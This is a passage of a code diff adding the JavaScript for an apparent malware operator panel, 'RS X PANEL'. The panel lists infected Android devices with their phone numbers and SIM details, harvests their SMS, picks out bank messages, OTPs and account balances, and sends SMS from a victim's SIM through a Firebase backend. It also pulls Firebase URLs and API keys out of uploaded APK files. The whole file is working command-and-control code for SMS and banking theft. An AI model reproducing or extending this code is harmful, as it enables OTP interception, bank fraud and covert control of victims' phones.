+            if (e.target.closest('.send-btn-small')) return;
+            const id = card.dataset.id;
+            const dev = allDevices.find(d => d.id === id);
+            if (dev) openDetail(dev);
+        });
+    });
+    deviceGrid.querySelectorAll('.send-btn-small').forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            e.stopPropagation();
+            const id = btn.dataset.id;
+            const dev = allDevices.find(d => d.id === id);
+            if (dev) openDetail(dev);
+        });
+    });
+}
+
+function updateStats() {
+    const total = allDevices.length;
+    const online = allDevices.filter(d => d.status).length;
+    const offline = total - online;
+    let bankTotal = 0;
+    for (const id of Object.keys(messageCache)) {
+        bankTotal += getDeviceBankSms(id).length;
+    }
+    totalStat.textContent = total;
+    onlineStat.textContent = online;
+    offlineStat.textContent = offline;
+    bankStat.textContent = bankTotal;
+}
+
+// DETAIL MODAL
+async function openDetail(device) {
+    selectedDevice = device;
+    const displayName = device.deviceName || device.name || device.id;
+    $('detailDeviceName').textContent = displayName;
+    $('detailStatus').textContent = device.status ? '● Online' : '○ Offline';
+    $('detailStatus').style.color = device.status ? 'var(--green)' : 'var(--muted)';
+    $('detailBattery').textContent = (device.battery || 0);
+    const bankMsgs = getDeviceBankSms(device.id);
+    const allMsgs = messageCache[device.id] || [];
+    $('detailBankCount').textContent = bankMsgs.length;
+    $('detailSmsCount').textContent = allMsgs.length;
+    $('bankTabBadge').textContent = bankMsgs.length;
+    $('smsTabBadge').textContent = allMsgs.length;
+    detailPhoneDisplay.textContent = device.phone || '—';
+
+    renderInfoTab(device);
+    renderSims(device);
+    renderBankTab(device);
+    renderSmsList(device.id, '');
+
+    smsTo.value = device.phone || '';
+    smsBody.value = '';
+    sendResult.className = 'send-result';
+    sendResult.textContent = '';
+    sendDevicePhone.textContent = device.phone || '—';
+    updateSendBtnText();
+
+    switchTab('info');
+    detailModal.classList.add('active');
+
+    if (detailRefreshTimer) clearInterval(detailRefreshTimer);
+    detailRefreshTimer = setInterval(() => {
+        if (selectedDevice && detailModal.classList.contains('active')) {
+            loadMessagesForDevice(selectedDevice.id).then(() => {
+                const activeTab = document.querySelector('.tab-btn.active');
+                if (activeTab) {
+                    const tab = activeTab.dataset.tab;
+                    if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+                    else if (tab === 'bank') renderBankTab(selectedDevice);
+                    const bm = getDeviceBankSms(selectedDevice.id);
+                    const am = messageCache[selectedDevice.id] || [];
+                    $('detailBankCount').textContent = bm.length;
+                    $('detailSmsCount').textContent = am.length;
+                    $('bankTabBadge').textContent = bm.length;
+                    $('smsTabBadge').textContent = am.length;
+                }
+            });
+        }
+    }, 5000);
+}
+
+function renderInfoTab(device) {
+    const rows = [
+        { label: 'Device Name', value: device.deviceName || device.name || '—' },
+        { label: 'Phone Number', value: device.phone || '—' },
+        { label: 'Phone Name', value: device.phoneName || '—' },
+        { label: 'Network', value: device.network || '—' },
+        { label: 'Android', value: device.android || '—' },
+        { label: 'IP Address', value: device.ip || '—' },
+        { label: 'Storage', value: device.storage || '—' },
+        { label: 'CPU Arch', value: device.cpuArch || '—' },
+        { label: 'SDK Version', value: device.sdkVersion || '—' },
+        { label: 'SIM Cards', value: device.sims ? device.sims.length + ' SIM(s)' : '0 SIM(s)' },
+        { label: 'SIM 1 Number', value: (device.sims && device.sims[0] && device.sims[0].phoneNumber) ? device.sims[0].phoneNumber : '—' },
+        { label: 'SIM 2 Number', value: (device.sims && device.sims[1] && device.sims[1].phoneNumber) ? device.sims[1].phoneNumber : '—' },
+    ];
+    detailInfoList.innerHTML = `<div class="info-list">` + rows.map(r => `
+        <div class="info-row">
+            <span class="info-label">${esc(r.label)}</span>
+            <span class="info-value">${esc(r.value)}</span>
+        </div>
+    `).join('') + `</div>`;
+}
+
+function renderSims(device) {
+    if (!device.sims || !device.sims.length) {
+        detailSims.innerHTML = '<div style="color:var(--muted);padding:12px">—</div>';
+        return;
+    }
+    const rows = [];
+    device.sims.forEach((s, i) => {
+        if (s.phoneNumber) rows.push({ label: 'Phone #' + (i+1), value: s.phoneNumber });
+    });
+    device.sims.forEach((s, i) => {
+        if (s.network || s.carrier) rows.push({ label: 'Network #' + (i+1), value: s.network || s.carrier || '—' });
+    });
+    detailSims.innerHTML = rows.map(r => `
+        <div class="info-row">
+            <span class="info-label">${esc(r.label)}</span>
+            <span class="info-value" style="color:var(--cyan)">${esc(r.value)}</span>
+        </div>
+    `).join('');
+}
+
+function renderBankTab(device) {
+    const bankMsgs = getDeviceBankSms(device.id);
+    const allMsgs = messageCache[device.id] || [];
+    const balance = getLatestBalance(device.id);
+    const bankName = getLatestBankName(device.id);
+
+    bankDetectHeader.innerHTML = `
+        <div class="line1">Auto-detected from ${allMsgs.length} SMS</div>
+        <div class="line2">${bankMsgs.length} bank message(s) found</div>
+    `;
+
+    if (balance) {
+        latestBalanceCard.innerHTML = `
+            <div class="latest-balance-card">
+                <div class="lbl">Latest Balance · ${esc(bankName || 'Unknown')}</div>
+                <div class="amt">₹${esc(balance)}</div>
+            </div>
+        `;
+    } else {
+        latestBalanceCard.innerHTML = '';
+    }
+
+    if (!bankMsgs.length) {
+        bankMessageList.innerHTML = '<div style="color:var(--muted);padding:12px">No bank transactions.</div>';
+        return;
+    }
+
+    bankMessageList.innerHTML = bankMsgs.slice(0, 50).map(m => {
+        const otp = extractOtp(m);
+        const txType = detectTxType(m.message);
+        const bank = detectBankName(m.message, m.sender);
+        const bal = extractBalance(m);
+        const txnAmt = extractTransactionAmount(m.message);
+        const icon = txType === 'credit' ? '↘' : txType === 'debit' ? '↗' : '₹';
+        const badgeText = txType === 'credit' ? 'Credit' : txType === 'debit' ? 'Debit' : 'Bank';
+        const txnSign = txType === 'debit' ? '-' : (txType === 'credit' ? '+' : '');
+        const txnColor = txType === 'debit' ? 'var(--cyan)' : (txType === 'credit' ? 'var(--green)' : 'var(--cyan)');
+        return `
+            <div class="tx-card-bank">
+                <div class="tx-top">
+                    <div class="tx-circle">${icon}</div>
+                    <div>
+                        <span class="tx-bank-name">${esc(bank || 'BANK')}</span>
+                        <span class="tx-sender-code">${esc(m.sender || '')}</span>
+                    </div>
+                    <div class="tx-badge">${esc(badgeText)}</div>
+                </div>
+                <div class="tx-mid">
+                    <div>
+                        <div class="tx-mid-label">Available Balance</div>
+                        <div class="tx-mid-amt balance">₹${esc(bal || '—')}</div>
+                    </div>
+                    <div style="text-align:right">
+                        <div class="tx-mid-label">Transaction</div>
+                        <div class="tx-mid-amt txn" style="color:${txnColor}">${txnSign}₹${esc(txnAmt || '—')}</div>
+                    </div>
+                </div>
+                <div class="tx-divider"></div>
+                <div class="tx-network">📶 ${esc(device.network || 'Unknown')}</div>
+                <div class="tx-msg">${esc(m.message)}</div>
+                <div class="tx-date">${esc(m.dateTime || '')}</div>
+            </div>
+        `;
+    }).join('');
+}
+
+function renderSmsList(deviceId, search = '') {
+    const msgs = messageCache[deviceId] || [];
+    const filtered = search ? msgs.filter(m =>
+        m.message.toLowerCase().includes(search.toLowerCase()) ||
+        (m.sender && m.sender.toLowerCase().includes(search.toLowerCase()))
+    ) : msgs;
+    $('smsCountLabel').textContent = `(${filtered.length})`;
+    const container = $('messageList');
+    if (!filtered.length) {
+        container.innerHTML = '<div style="color:var(--muted);padding:12px">No messages.</div>';
+        return;
+    }
+    container.innerHTML = filtered.slice(0, 150).map(m => {
+        const otp = extractOtp(m);
+        const bank = isBankSms(m);
+        const numMatch = m.message.match(/(\+91|0)?[6-9]\d{9}/);
+        const hasPhone = numMatch ? true : false;
+        const txType = detectTxType(m.message);
+        const txClass = txType === 'credit' ? 'credit' : txType === 'debit' ? 'debit' : '';
+        const txLabel = txType === 'credit' ? '💰 Credit' : txType === 'debit' ? '💸 Debit' : '';
+        const bankName = detectBankName(m.message, m.sender);
+        const bal = extractBalance(m);
+        // Get device phone for OTP
+        const dev = allDevices.find(d => d.id === deviceId);
+        const devPhone = dev ? (dev.phone || '') : '';
+        return `
+            <div class="sms-item">
+                <div class="sms-header">
+                    <span>${esc(m.sender || 'Unknown')}</span>
+                    <span>${esc(m.dateTime || '')}</span>
+                </div>
+                <div class="sms-body">${esc(m.message)}</div>
+                ${otp ? `<div class="sms-otp-box">🔐 OTP: ${otp}</div>` : ''}
+                ${otp && devPhone ? `<div class="sms-otp-phone">📱 ${esc(devPhone)}</div>` : ''}
+                ${bank ? `<div class="bank-tag">🏦 Bank</div>` : ''}
+                ${bankName ? `<div class="bank-name-tag">🏛️ ${esc(bankName)}</div>` : ''}
+                ${txType ? `<div class="tx-type ${txClass}">${txLabel}</div>` : ''}
+                ${bal ? `<div class="balance-tag">💰 Avl Bal: ₹${esc(bal)}</div>` : ''}
+                ${hasPhone ? `<div class="phone-tag">📱 ${esc(numMatch[0])}</div>` : ''}
+            </div>
+        `;
+    }).join('');
+}
+
+function switchTab(tabId) {
+    tabBtns.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === tabId));
+    Object.keys(tabContents).forEach(key => {
+        tabContents[key].classList.toggle('active', key === tabId);
+    });
+}
+
+tabBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+        const tab = btn.dataset.tab;
+        switchTab(tab);
+        if (selectedDevice) {
+            if (tab === 'bank') renderBankTab(selectedDevice);
+            else if (tab === 'sms') renderSmsList(selectedDevice.id, smsSearch.value);
+        }
+    });
+});
+
+function updateSendBtnText() {
+    sendSmsBtn.textContent = '📤 Send via SIM ' + simChoice;
+}
+
+async function sendSms() {
+    if (!selectedDevice) { toast('No device selected', 'error'); return; }
+    const to = smsTo.value.trim();
+    const body = smsBody.value.trim();
+    if (!to || !body) { toast('Enter number and message', 'error'); return; }
+    sendSmsBtn.disabled = true;
+    sendResult.className = 'send-result';
+    sendResult.textContent = 'Sending…';
+
+    try {
+        const payload = {
+            sim: simChoice,
+            to: to,
+            message: body,
+            sent: true,
+            timestamp: new Date().toISOString()
+        };
+        const path = 'messages/' + selectedDevice.id + '/outgoing_' + Date.now();
+        await fbSet(path, payload);
+        sendResult.className = 'send-result ok';
+        sendResult.textContent = '✅ Sent successfully';
+        toast('SMS sent', 'success');
+        await loadMessagesForDevice(selectedDevice.id);
+        renderSmsList(selectedDevice.id, smsSearch.value);
+        renderBankTab(selectedDevice);
+        const bm = getDeviceBankSms(selectedDevice.id);
+        const am = messageCache[selectedDevice.id] || [];
+        $('detailBankCount').textContent = bm.length;
+        $('detailSmsCount').textContent = am.length;
+        $('bankTabBadge').textContent = bm.length;
+        $('smsTabBadge').textContent = am.length;
+    } catch(e) {
+        sendResult.className = 'send-result err';
+        sendResult.textContent = '❌ Error: ' + e.message;
+        toast('Send failed', 'error');
+    } finally {
+        sendSmsBtn.disabled = false;
+        updateSendBtnText();
+    }
+}
+
+function startPolling() {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = setInterval(() => {
+        if (activeConn) refreshDevices();
+    }, 8000);
+}
+
+function stopPolling() {
+    if (pollTimer) clearInterval(pollTimer);
+    pollTimer = null;
+    if (detailRefreshTimer) clearInterval(detailRefreshTimer);
+    detailRefreshTimer = null;
+    if (clockTimer) clearInterval(clockTimer);
+    clockTimer = null;
+}
+
+function esc(str) {
+    if (!str) return '';
+    const div = document.createElement('div');
+    div.textContent = str;
+    return div.innerHTML;
+}
+
+// EVENT BINDING
+$('newConnBtn').addEventListener('click', () => {
+    accLabel.value = '';
+    accUrl.value = '';
+    accKey.value = '';
+    setupError.classList.add('hidden');
+    newAccountModal.classList.add('active');
+});
+closeAccount.addEventListener('click', () => newAccountModal.classList.remove('active'));
+cancelAccountBtn.addEventListener('click', () => newAccountModal.classList.remove('active'));
+newAccountModal.addEventListener('click', (e) => {
+    if (e.target === newAccountModal) newAccountModal.classList.remove('active');
+});
+
+apkUploadArea.addEventListener('click', () => apkFileInput.click());
+apkFileInput.addEventListener('change', (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+        let content = ev.target.result;
+        if (content instanceof ArrayBuffer) {
+            const decoder = new TextDecoder('utf-8', { fatal: false });
+            content = decoder.decode(content);
+        }
+        const urlMatch = content.match(/(https?:\/\/[^\s"']+\.firebaseio\.com)/);
+        const keyMatch = content.match(/AIza[0-9A-Za-z_-]{35}/);
+        if (urlMatch) accUrl.value = urlMatch[1];
+        if (keyMatch) accKey.value = keyMatch[0];
+        if (urlMatch || keyMatch) toast('Extracted from file', 'success');
+        else toast('No Firebase credentials found', 'error');
+    };
+    reader.readAsArrayBuffer(file);
+});
+
+saveAccountBtn.addEventListener('click', () => {
+    const url = accUrl.value.trim();
+    const key = accKey.value.trim();
+    if (!url) {
+        setupError.textContent = 'Firebase URL dalna zaroori hai';
+        setupError.classList.remove('hidden');
+        return;
+    }
+    if (!key) {
+        setupError.textContent = 'API Key bhi zaroori hai bhai';
+        setupError.classList.remove('hidden');
+        return;
+    }
+    const dup = CONNECTIONS.find(c => c.url === url);
+    if (dup) {
+        setupError.textContent = '⚠️ Already exists: "' + (dup.label || dup.url) + '"';
+        setupError.classList.remove('hidden');
+        toast('Firebase already exists!', 'error');
+        return;
+    }
+    let label = accLabel.value.trim();
+    if (!label) {
+        try { label = new URL(url).hostname.replace(/\.firebaseio\.com.*/,''); }
+        catch(e) { label = url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,''); }
+    }
+    setupError.classList.add('hidden');
+    const conn = {
+        label: label,
+        url: url,
+        key: key,
+        date: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+    };
+    CONNECTIONS.push(conn);
+    localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
+    newAccountModal.classList.remove('active');
+    renderConnections();
+    toast('Account "' + label + '" saved! Ab Connect kar le.', 'success');
+    updateShareLink();
+});
+
+searchInput.addEventListener('input', () => {
+    searchQuery = searchInput.value;
+    renderDeviceGrid();
+});
+
+document.querySelectorAll('.filter').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.filter').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        filterMode = btn.dataset.filter;
+        renderDeviceGrid();
+    });
+});
+
+let sortToggle = false;
+$('sortBtn').addEventListener('click', () => {
+    sortToggle = !sortToggle;
+    sortMode = sortToggle ? 'oldest' : 'newest';
+    $('sortBtn').textContent = (sortToggle ? 'Oldest' : 'Newest') + ' ▼';
+    renderDeviceGrid();
+});
+
+$('refreshBtn').addEventListener('click', () => {
+    refreshDevices();
+    toast('Refreshing...', 'success');
+});
+
+$('logoutBtn').addEventListener('click', () => {
+    stopPolling();
+    activeConn = null;
+    allDevices = [];
+    dashboardScreen.style.display = 'none';
+    showHome();
+    toast('Disconnected');
+});
+
+closeDetail.addEventListener('click', () => {
+    detailModal.classList.remove('active');
+    if (detailRefreshTimer) clearInterval(detailRefreshTimer);
+    detailRefreshTimer = null;
+});
+detailModal.addEventListener('click', (e) => {
+    if (e.target === detailModal) {
+        detailModal.classList.remove('active');
+        if (detailRefreshTimer) clearInterval(detailRefreshTimer);
+        detailRefreshTimer = null;
+    }
+});
+
+smsSearch.addEventListener('input', () => {
+    if (selectedDevice) renderSmsList(selectedDevice.id, smsSearch.value);
+});
+
+$('refreshSmsBtn').addEventListener('click', async () => {
+    if (selectedDevice) {
+        await loadMessagesForDevice(selectedDevice.id);
+        renderSmsList(selectedDevice.id, smsSearch.value);
+        renderBankTab(selectedDevice);
+        const bm = getDeviceBankSms(selectedDevice.id);
+        const am = messageCache[selectedDevice.id] || [];
+        $('detailBankCount').textContent = bm.length;
+        $('detailSmsCount').textContent = am.length;
+        $('bankTabBadge').textContent = bm.length;
+        $('smsTabBadge').textContent = am.length;
+    }
+});
+
+sendSmsBtn.addEventListener('click', sendSms);
+
+document.querySelectorAll('.sim-toggle button').forEach(btn => {
+    btn.addEventListener('click', () => {
+        document.querySelectorAll('.sim-toggle button').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        simChoice = parseInt(btn.dataset.sim);
+        updateSendBtnText();
+    });
+});
+
+// INIT
+const loaded = loadFromURL();
+if (!loaded) {
+    renderConnections();
+}
+updateShareLink();
+console.log('RS X PANEL v3.3 · No quota errors · Exact bank design · Info rows');
+</script>
 </body>
 </html>
